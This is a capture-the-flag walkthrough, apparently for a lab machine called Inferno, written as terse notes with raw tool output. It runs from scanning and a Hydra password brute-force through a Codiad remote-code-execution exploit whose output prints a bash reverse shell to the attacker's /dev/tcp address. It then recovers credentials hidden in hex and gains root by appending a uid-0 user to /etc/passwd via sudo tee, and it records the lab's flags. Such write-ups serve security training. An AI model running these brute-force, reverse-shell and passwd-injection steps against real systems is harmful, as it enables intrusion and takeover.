ip add:10.10.76.214

rustscan:
Discovered open port 22/tcp on 10.10.76.214
Discovered open port 80/tcp on 10.10.76.214
Discovered open port 10081/tcp on 10.10.76.214
Discovered open port 15345/tcp on 10.10.76.214
Discovered open port 808/tcp on 10.10.76.214
Discovered open port 27374/tcp on 10.10.76.214
Discovered open port 8088/tcp on 10.10.76.214
Discovered open port 11201/tcp on 10.10.76.214
Discovered open port 2150/tcp on 10.10.76.214
Discovered open port 2989/tcp on 10.10.76.214
Discovered open port 20011/tcp on 10.10.76.214
Discovered open port 1001/tcp on 10.10.76.214
Discovered open port 2988/tcp on 10.10.76.214
Discovered open port 20012/tcp on 10.10.76.214
Discovered open port 106/tcp on 10.10.76.214



nmap:

PORT      STATE SERVICE      REASON  VERSION
22/tcp    open  ssh          syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
80/tcp    open  http         syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
106/tcp   open  pop3pw?      syn-ack
1001/tcp  open  webpush?     syn-ack
2150/tcp  open  dynamic3d?   syn-ack
2988/tcp  open  hippad?      syn-ack
2989/tcp  open  zarkov?      syn-ack
8088/tcp  open  radan-http?  syn-ack
10081/tcp open  famdc?       syn-ack
11201/tcp open  smsqp?       syn-ack
15345/tcp open  xpilot?      syn-ack
20011/tcp open  unknown      syn-ack
20012/tcp open  ss-idi-disc? syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



gobuster:
gobuster dir  -u http://10.10.76.214/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt  -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.76.214/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/16 09:36:20 Starting gobuster
===============================================================
/inferno (Status: 401)

we have a log in pop-up. We can try to use hydra to brute force the login 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.76.214 http-get /inferno/  -I -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-16 09:39:46
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.76.214:80/inferno/
[STATUS] 11105.00 tries/min, 11105 tries in 00:01h, 14333294 to do in 21:31h, 64 active
[80][http-get] host: 10.10.76.214   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-16 09:41:03


try these credentials again

and we find out that the software running is CODIAD

let's try to find an exploit :=> https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit


run the exploit:

ython2 exploit.py http://admin:dante1@inferno.thm/inferno/ 'admin' 'dante1' 10.8.29.89 1234 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.8.29.89/1235 0>&1 2>&1"' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!

cd to /home/dante/Downloads

www-data@Inferno:/home/dante/Downloads$ ls -la
ls -la
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante    4096 Jan 11  2021 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoXX.docx
www-data@Inferno:/home/dante/Downloads$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33


using cyberchef we can see what this^ is meaning :




«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3


we have the pass for dante
lets try to ssh to dante and V1rg1l10h3lpm3 =-> great success!!!

read the local.txt
77f6f3c544ec0811e2d1243e2e0d1835

PRIVESC

ante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee


lets use tee to add a new passwd to /etc/passwd
dante@Inferno:~$ LFILE=/etc/passwd
dante@Inferno:~$ echo "noraj:$(openssl passwd -6 -salt noraj password):0:0:noraj:/root:/bin/bash" | sudo tee -a "$LFILE"
noraj:$6$noraj$0xd4tNtgvg16YDhJVioiZDy5VDEtbXUsXxXLTM0tfg5AuoIAaslp87j7GlfjoMWnt2kJdYc2.2q8JbilrVOip/:0:0:noraj:/root:/bin/bash
dante@Inferno:~$ su noraj
Password: 
root@Inferno:/home/dante#:cd /root
root@Inferno:~# ls
proof.txt
root@Inferno:~# cat proof.txt
Congrats!

You've rooted Inferno!

f332678ed0d0767d7434b8516a7c6144

mindsflee
root@Inferno:~# exit



root flag:

f332678ed0d0767d7434b8516a7c6144


